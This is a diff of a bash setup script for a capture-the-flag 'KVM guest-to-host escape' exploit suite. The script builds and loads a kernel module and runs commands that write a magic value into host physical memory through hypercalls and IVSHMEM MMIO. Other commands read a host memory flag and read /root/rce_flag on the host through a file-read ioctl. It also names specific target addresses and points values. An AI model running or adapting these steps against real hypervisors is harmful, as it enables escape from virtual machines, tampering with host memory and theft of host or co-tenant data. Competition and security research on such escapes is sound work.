@@ -1,6 +1,6 @@
 #!/bin/bash
 # KVM CTF Exploit Suite - FINAL Setup Script
-# Updated for correct GPA/HPA handling
+# Updated for correct GPA/HPA handling and fixed bash arithmetic
 
 set -e
 
@@ -15,7 +15,7 @@ print_banner() {
     echo -e "${BLUE}"
     echo "╔═══════════════════════════════════════════════════════╗"
     echo "║     KVM CTF Guest-to-Host Escape Exploit Suite       ║"
-    echo "║           FINAL - Proper Address Handling            ║"
+    echo "║      FINAL - Hypercall Buffer Support Edition        ║"
     echo "╚═══════════════════════════════════════════════════════╝"
     echo -e "${NC}"
 }
@@ -49,47 +49,47 @@ check_root() {
 
 check_dependencies() {
     print_info "Checking dependencies..."
-    
+
     local missing_deps=()
-    
+
     if ! command -v gcc &> /dev/null; then
         missing_deps+=("gcc")
     fi
-    
+
     if ! command -v make &> /dev/null; then
         missing_deps+=("make")
     fi
-    
+
     if ! command -v python3 &> /dev/null; then
         missing_deps+=("python3")
     fi
-    
+
     if [ ! -d "/lib/modules/$(uname -r)/build" ]; then
         print_warning "Kernel headers not found for $(uname -r)"
         missing_deps+=("linux-headers-$(uname -r)")
     fi
-    
+
     if [ ${#missing_deps[@]} -ne 0 ]; then
         print_error "Missing dependencies: ${missing_deps[*]}"
         print_info "Install with: apt-get install ${missing_deps[*]}"
         exit 1
     fi
-    
+
     print_success "All dependencies found"
 }
 
 build_module() {
-    print_info "Building FINAL kernel module (with GPA/HPA support)..."
+    print_info "Building FINAL kernel module (with hypercall buffer support)..."
     make clean &> /dev/null || true
-    
+
     if ! make module 2>&1 | tee /tmp/build.log; then
         print_error "Build failed. Check /tmp/build.log"
         exit 1
     fi
-    
+
     if [ -f "kvm_probe_drv.ko" ]; then
         print_success "Kernel module built successfully"
-        print_info "Module features: GPA (guest), HPA (host), MMIO (hardware)"
+        print_info "Module features: Hypercall buffers, GPA/HPA, MMIO"
     else
         print_error "Failed to build kernel module"
         exit 1
@@ -98,14 +98,14 @@ build_module() {
 
 build_userspace() {
     print_info "Building FINAL userspace tools..."
-    
+
     if ! make userspace 2>&1 | tee -a /tmp/build.log; then
         print_error "Build failed. Check /tmp/build.log"
         exit 1
     fi
-    
+
     if [ -f "kvm_prober" ]; then
-        print_success "kvm_prober built (with readhpa/writehpa commands)"
+        print_success "kvm_prober built (with hypercall_read/hypercall_write)"
     else
         print_error "Failed to build kvm_prober"
         exit 1
@@ -114,17 +114,17 @@ build_userspace() {
 
 load_module() {
     print_info "Loading kernel module..."
-    
+
     rmmod kvm_probe_drv 2>/dev/null || true
-    
+
     if ! insmod kvm_probe_drv.ko; then
         print_error "Failed to load module"
         dmesg | tail -10
         exit 1
     fi
-    
+
     sleep 1
-    
+
     if [ -e "/dev/kvm_probe_dev" ] || [ -e "/dev/kvm_probe_drv" ]; then
         print_success "Module loaded, device created"
         ls -la /dev/kvm_probe* 2>/dev/null
@@ -137,10 +137,10 @@ load_module() {
 
 install_tools() {
     print_info "Installing tools..."
-    
+
     cp kvm_prober /usr/local/bin/
     chmod +x /usr/local/bin/kvm_prober
-    
+
     # Make Python exploit executable
     if [ -f "ultimate_kvm_exploit.py" ]; then
         chmod +x ultimate_kvm_exploit.py
@@ -148,14 +148,14 @@ install_tools() {
     else
         print_warning "ultimate_kvm_exploit.py not found"
     fi
-    
+
     print_success "Tools installed to /usr/local/bin/"
 }
 
 show_address_warning() {
     echo ""
     print_critical "═══════════════════════════════════════════════════════"
-    print_critical "CRITICAL: Understanding Address Spaces"
+    print_critical "CRITICAL: Understanding Address Spaces & Hypercalls"
     print_critical "═══════════════════════════════════════════════════════"
     echo ""
     echo -e "${CYAN}Guest Physical (GPA) ≠ Host Physical (HPA)${NC}"
@@ -165,9 +165,16 @@ show_address_warning() {
     echo "  GPA 0x64279a8                HPA 0x64279a8 ← FLAG HERE!"
     echo "  (guest's RAM)                (actual host RAM)"
     echo ""
+    echo -e "${CYAN}Hypercall Data Transfer:${NC}"
+    echo "  • Hypercalls execute in HOST context"
+    echo "  • Can't return HOST pointers to guest"
+    echo "  • Must use GUEST buffers (pass GPA)"
+    echo "  • Return status/size in rax register"
+    echo ""
     echo -e "${CYAN}To access HOST memory from guest:${NC}"
-    echo "  ✓ Use MMIO (via IVSHMEM BARs)"
-    echo "  ✓ Use HPA IOCTLs (readhpa/writehpa)"
+    echo "  ✓ Hypercalls (with guest buffer for results)"
+    echo "  ✓ MMIO (via IVSHMEM BARs)"
+    echo "  ✓ HPA IOCTLs (readhpa/writehpa - uses ioremap)"
     echo "  ✗ DON'T use GPA - that's guest memory only!"
     echo ""
     print_critical "═══════════════════════════════════════════════════════"
@@ -177,11 +184,11 @@ show_address_warning() {
 show_pci_info() {
     print_info "Scanning for PCI devices and IVSHMEM..."
     echo ""
-    
+
     echo -e "${BLUE}PCI Devices:${NC}"
     lspci | head -10
     echo ""
-    
+
     echo -e "${BLUE}IVSHMEM Devices (vendor 1af4 - Red Hat/QEMU):${NC}"
     if lspci -d 1af4: 2>/dev/null | grep -q .; then
         lspci -d 1af4: -v
@@ -197,13 +204,13 @@ show_pci_info() {
         fi
     fi
     echo ""
-    
+
     echo -e "${BLUE}BAR Information (first 3 devices with BARs):${NC}"
     count=0
     for dev in /sys/bus/pci/devices/*/resource; do
         if [ $count -ge 3 ]; then break; fi
         bdf=$(basename $(dirname $dev))
-        
+
         # Check if device has any non-zero BARs
         if grep -qv "0x0000000000000000" "$dev" 2>/dev/null; then
             echo "Device: $bdf"
@@ -214,21 +221,32 @@ show_pci_info() {
                     end=${parts[1]}
                     flags=${parts[2]}
                     if [ "$start" != "0x0000000000000000" ]; then
-                        size=$((16#${end} - 16#${start} + 1))
-                        is_io=$((16#${flags} & 0x1))
-                        is_prefetch=$((16#${flags} & 0x8))
-                        
-                        if [ $is_io -eq 1 ]; then
+                        # Use python3 for hex arithmetic (bash can't handle large hex)
+                        size=$(python3 -c "print(int('${end}', 16) - int('${start}', 16) + 1)" 2>/dev/null || echo "unknown")
+                        is_io=$(python3 -c "print(int('${flags}', 16) & 0x1)" 2>/dev/null || echo "0")
+                        is_prefetch=$(python3 -c "print(int('${flags}', 16) & 0x8)" 2>/dev/null || echo "0")
+
+                        if [ "$is_io" = "1" ]; then
                             type="I/O"
                         else
                             type="MMIO"
                         fi
-                        
-                        if [ $is_prefetch -ne 0 ] && [ $size -ge 1048576 ]; then
-                            type="$type (PREFETCH - likely IVSHMEM!)"
+
+                        # Check if prefetchable and >= 1MB
+                        if [ "$is_prefetch" != "0" ] && [ "$size" != "unknown" ]; then
+                            if python3 -c "exit(0 if $size >= 1048576 else 1)" 2>/dev/null; then
+                                type="$type (PREFETCH - likely IVSHMEM!)"
+                            fi
                         fi
-                        
-                        echo "  $start - $end ($type, size: 0x$(printf '%x' $size))"
+
+                        # Format size as hex
+                        if [ "$size" != "unknown" ]; then
+                            size_hex=$(python3 -c "print('0x%x' % $size)" 2>/dev/null || echo "$size")
+                        else
+                            size_hex="unknown"
+                        fi
+
+                        echo "  $start - $end ($type, size: $size_hex)"
                     fi
                 fi
             done
@@ -246,29 +264,32 @@ show_targets() {
     echo "  HOST Physical: 0x64279a8"
     echo "  HOST Virtual:  0xffffffff826279a8"
     echo "  Required Value: 0xdeadbeef41424344"
+    echo "  Methods: hypercall_write, IVSHMEM BARs"
     echo ""
     echo -e "${BLUE}Target 2: Memory Read Flag (50-100k points)${NC}"
     echo "  HOST Physical: 0x695ee10"
     echo "  HOST Virtual:  0xffffffff82b5ee10"
     echo "  Action: Read flag content"
+    echo "  Methods: hypercall_read (with guest buffer)"
     echo ""
     echo -e "${BLUE}Target 3: RCE Flag (250k points)${NC}"
     echo "  File Path: /root/rce_flag (on HOST)"
     echo "  Action: Read host file from guest"
+    echo "  Methods: readfile IOCTL"
     echo ""
 }
 
 run_basic_tests() {
     print_info "Running basic functionality tests..."
     echo ""
-    
+
     echo -e "${BLUE}Test 1: Device Access${NC}"
     if kvm_prober getkaslr &>/dev/null; then
         print_success "KASLR detection works"
     else
         print_warning "KASLR detection failed (may be expected)"
     fi
-    
+
     echo -e "${BLUE}Test 2: GPA Operations (Guest Memory)${NC}"
     if kvm_prober writegpa 1000000 deadbeefcafebabe &>/dev/null; then
         print_success "GPA write works (writes to GUEST memory)"
@@ -278,46 +299,59 @@ run_basic_tests() {
     else
         print_warning "GPA operations failed"
     fi
-    
-    echo -e "${BLUE}Test 3: HPA Operations (Host Memory Access)${NC}"
-    if kvm_prober writehpa 64279a8 4443424241efbeadde 2>&1 | grep -q "ioremap failed"; then
-        print_warning "HPA direct access failed (expected - need IVSHMEM)"
-        print_info "This is normal - ioremap can't map arbitrary host RAM"
-    elif kvm_prober writehpa 64279a8 4443424241efbeadde &>/dev/null; then
-        print_success "HPA write works! (unusual but good)"
+
+    echo -e "${BLUE}Test 3: Hypercall Operations${NC}"
+    if kvm_prober hypercall 0 0 0 0 0 &>/dev/null; then
+        print_success "Hypercalls work (check dmesg for details)"
+    else
+        print_warning "Hypercall test failed"
     fi
-    
+
     echo -e "${BLUE}Test 4: File Read (RCE)${NC}"
     if kvm_prober readfile /etc/hostname 0 50 &>/dev/null; then
         print_success "File read capability works!"
     else
         print_warning "File read failed"
     fi
-    
+
     echo ""
 }
 
 show_exploitation_guide() {
     echo ""
-    print_info "Exploitation Strategy:"
+    print_info "Exploitation Strategy (Updated for Hypercalls):"
     echo ""
-    echo -e "${CYAN}Step 1: Find IVSHMEM BAR${NC}"
-    echo "  lspci -d 1af4:"
-    echo "  cat /sys/bus/pci/devices/0000:XX:XX.X/resource"
+    echo -e "${CYAN}Method 1: Hypercall Write${NC}"
+    echo "  kvm_prober hypercall_write 0x64279a8 0xdeadbeef41424344"
+    echo "  • Hypercall 100: WRITE to host memory"
+    echo "  • Returns status in rax"
     echo ""
-    echo -e "${CYAN}Step 2: Calculate Target Address${NC}"
-    echo "  If BAR at 0xfe800000, try:"
-    echo "  - kvm_prober writemmio_buf <bar+0x64279a8> 4443424241efbeadde"
-    echo "  - kvm_prober writemmio_buf <bar+0x4279a8>  4443424241efbeadde"
+    echo -e "${CYAN}Method 2: Hypercall Read${NC}"
+    echo "  kvm_prober hypercall_read 0x695ee10 256"
+    echo "  • Hypercall 101: READ from host memory"
+    echo "  • Allocates guest buffer automatically"
+    echo "  • Passes guest buffer GPA to host"
+    echo "  • Host writes result to guest buffer"
+    echo "  • Returns bytes read in rax"
     echo ""
-    echo -e "${CYAN}Step 3: Or Use Ultimate Exploit (Recommended)${NC}"
+    echo -e "${CYAN}Method 3: IVSHMEM BARs${NC}"
+    echo "  lspci -d 1af4: -v"
+    echo "  kvm_prober writemmio_buf <bar+offset> 4443424241efbeadde"
+    echo ""
+    echo -e "${CYAN}Method 4: RCE File Read${NC}"
+    echo "  kvm_prober readfile /root/rce_flag 0 256"
+    echo ""
+    echo -e "${CYAN}Ultimate Exploit (Recommended):${NC}"
     echo "  sudo python3 ultimate_kvm_exploit.py"
+    echo "  • Tries all 4 methods automatically"
+    echo "  • Handles guest buffer allocation"
+    echo "  • Parses hypercall return values"
     echo ""
 }
 
 run_exploit() {
     local exploit_type=$1
-    
+
     case $exploit_type in
         "ultimate")
             print_info "Running ULTIMATE exploit (RECOMMENDED)..."
@@ -328,21 +362,36 @@ run_exploit() {
                 exit 1
             fi
             ;;
+        "hypercall")
+            print_info "Testing hypercall methods..."
+            echo ""
+            echo "# Hypercall Write Test:"
+            kvm_prober hypercall_write 0x64279a8 0xdeadbeef41424344
+            echo ""
+            echo "# Hypercall Read Test:"
+            kvm_prober hypercall_read 0x695ee10 256
+            echo ""
+            echo "# Check dmesg for hypercall output:"
+            dmesg | tail -20 | grep -i hypercall || echo "No hypercall logs found"
+            ;;
         "manual")
             print_info "Manual exploitation mode..."
             print_info "Try these commands:"
             echo ""
-            echo "# Find IVSHMEM:"
-            echo "lspci -d 1af4:"
+            echo "# Hypercall methods:"
+            echo "kvm_prober hypercall_write 0x64279a8 0xdeadbeef41424344"
+            echo "kvm_prober hypercall_read 0x695ee10 256"
             echo ""
-            echo "# Try different methods:"
-            echo "kvm_prober writehpa 64279a8 4443424241efbeadde"
+            echo "# IVSHMEM methods:"
+            echo "lspci -d 1af4:"
             echo "kvm_prober writemmio_buf <bar_addr> 4443424241efbeadde"
+            echo ""
+            echo "# RCE method:"
             echo "kvm_prober readfile /root/rce_flag 0 256"
             ;;
         *)
             print_error "Unknown exploit type: $exploit_type"
-            print_info "Available: ultimate, manual"
+            print_info "Available: ultimate, hypercall, manual"
             exit 1
             ;;
     esac
@@ -358,25 +407,26 @@ show_usage() {
     echo "  test           - Run basic tests"
     echo "  info           - Show PCI/IVSHMEM information"
     echo "  guide          - Show exploitation guide"
-    echo "  exploit [type] - Run exploit (ultimate|manual)"
+    echo "  exploit [type] - Run exploit (ultimate|hypercall|manual)"
     echo "  uninstall      - Remove module and tools"
     echo "  clean          - Clean build artifacts"
     echo "  help           - Show this help"
     echo ""
     echo "Quick Start:"
-    echo "  sudo ./setup.sh install          # Install everything"
-    echo "  sudo ./setup.sh info              # Check for IVSHMEM"
-    echo "  sudo ./setup.sh exploit ultimate  # Run ultimate exploit"
+    echo "  sudo ./setup.sh install             # Install everything"
+    echo "  sudo ./setup.sh info                 # Check for IVSHMEM"
+    echo "  sudo ./setup.sh exploit hypercall    # Test hypercalls"
+    echo "  sudo ./setup.sh exploit ultimate     # Run full exploit"
     echo ""
     echo "Files:"
-    echo "  ✓ kvm_probe_drv.c  - FINAL driver (GPA/HPA/MMIO)"
-    echo "  ✓ kvm_prober.c     - FINAL tool (readhpa/writehpa)"
-    echo "  ✓ ultimate_kvm_exploit.py - FINAL exploit (8 methods)"
+    echo "  ✓ kvm_probe_drv.c         - Kernel driver (hypercall buffers)"
+    echo "  ✓ kvm_prober.c            - CLI tool (hypercall_read/write)"
+    echo "  ✓ ultimate_kvm_exploit.py - Python exploit (4 methods)"
 }
 
 main() {
     print_banner
-    
+
     case "${1:-install}" in
         "install")
             check_root
@@ -393,62 +443,61 @@ main() {
             print_success "Installation complete!"
             echo ""
             print_info "Next steps:"
-            echo "  1. Review address space info above"
-            echo "  2. Run: sudo ./setup.sh info"
+            echo "  1. Review hypercall protocol above"
+            echo "  2. Run: sudo ./setup.sh exploit hypercall"
             echo "  3. Run: sudo ./setup.sh exploit ultimate"
             ;;
-        
+
         "build")
             check_dependencies
             build_module
             build_userspace
             print_success "Build complete!"
             ;;
-        
+
         "load")
             check_root
             load_module
             ;;
-        
+
         "test")
             check_root
             run_basic_tests
             ;;
-        
+
         "info")
             show_address_warning
             show_pci_info
             show_targets
             ;;
-        
+
         "guide")
             show_exploitation_guide
             ;;
-        
+
         "exploit")
             check_root
             run_exploit "${2:-ultimate}"
             ;;
-        
+
         "uninstall")
             check_root
             print_info "Uninstalling..."
             rmmod kvm_probe_drv 2>/dev/null || true
             rm -f /usr/local/bin/kvm_prober
-            rm -f /usr/local/bin/kvm_direct_exploit
             print_success "Uninstall complete!"
             ;;
-        
+
         "clean")
             print_info "Cleaning..."
             make clean &>/dev/null || true
             print_success "Clean complete!"
             ;;
-        
+
         "help")
             show_usage
             ;;
-        
+
         *)
             print_error "Unknown command: $1"
             show_usage
